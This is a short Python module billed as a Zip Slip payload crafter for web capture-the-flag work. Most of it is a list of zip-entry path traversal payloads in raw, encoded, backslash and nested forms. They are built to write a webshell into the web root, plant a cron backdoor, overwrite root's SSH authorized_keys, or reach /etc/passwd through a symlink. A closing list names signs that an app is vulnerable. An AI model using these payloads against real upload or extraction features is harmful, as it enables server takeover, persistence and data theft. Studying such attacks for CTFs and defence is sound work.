"""
Zip Slip Payload Crafter for Web CTF.
Covers zip archive path traversal, symlink-based extraction, and RCE via zip slip.
"""

from typing import List, Dict


def get_zip_slip_payloads() -> List[Dict[str, str]]:
    """Generate Zip Slip payloads."""
    return [
        {
            "name": "Basic Path Traversal",
            "payload": "../../../../../../tmp/shell.php",
            "desc": "Zip entry with path traversal to write outside extraction directory."
        },
        {
            "name": "Absolute Path",
            "payload": "/tmp/shell.php",
            "desc": "Zip entry with absolute path."
        },
        {
            "name": "Encoded Path Traversal",
            "payload": "..%2f..%2f..%2f..%2ftmp%2fshell.php",
            "desc": "URL-encoded path traversal."
        },
        {
            "name": "Double Encoded Traversal",
            "payload": "..%252f..%252f..%252ftmp%252fshell.php",
            "desc": "Double URL-encoded path traversal."
        },
        {
            "name": "Backslash Traversal",
            "payload": "..\\..\\..\\..\\tmp\\shell.php",
            "desc": "Backslash path traversal (Windows)."
        },
        {
            "name": "Nested Traversal",
            "payload": "....//....//....//tmp/shell.php",
            "desc": "Nested traversal to bypass single-pass filters."
        },
        {
            "name": "Symlink-Based Extraction",
            "payload": "Create symlink entry pointing to /etc/passwd",
            "desc": "Symlink in zip can redirect extraction to arbitrary files."
        },
        {
            "name": "Webshell via Zip Slip",
            "payload": "../../../../var/www/html/shell.php",
            "desc": "Write webshell to web root via zip slip."
        },
        {
            "name": "Config Overwrite",
            "payload": "../../../../etc/cron.d/backdoor",
            "desc": "Overwrite cron config for persistence."
        },
        {
            "name": "SSH Key Overwrite",
            "payload": "../../../../root/.ssh/authorized_keys",
            "desc": "Overwrite SSH authorized_keys for persistence."
        }
    ]


def get_zip_slip_indicators() -> List[Dict[str, str]]:
    """Indicators that Zip Slip is possible."""
    return [
        {
            "indicator": "Unsafe zip extraction",
            "desc": "If the app extracts zip files without validating entry paths."
        },
        {
            "indicator": "No path normalization",
            "desc": "If the app doesn't normalize or validate entry paths."
        },
        {
            "indicator": "Archive upload feature",
            "desc": "If the app allows uploading zip/archive files."
        }
    ]
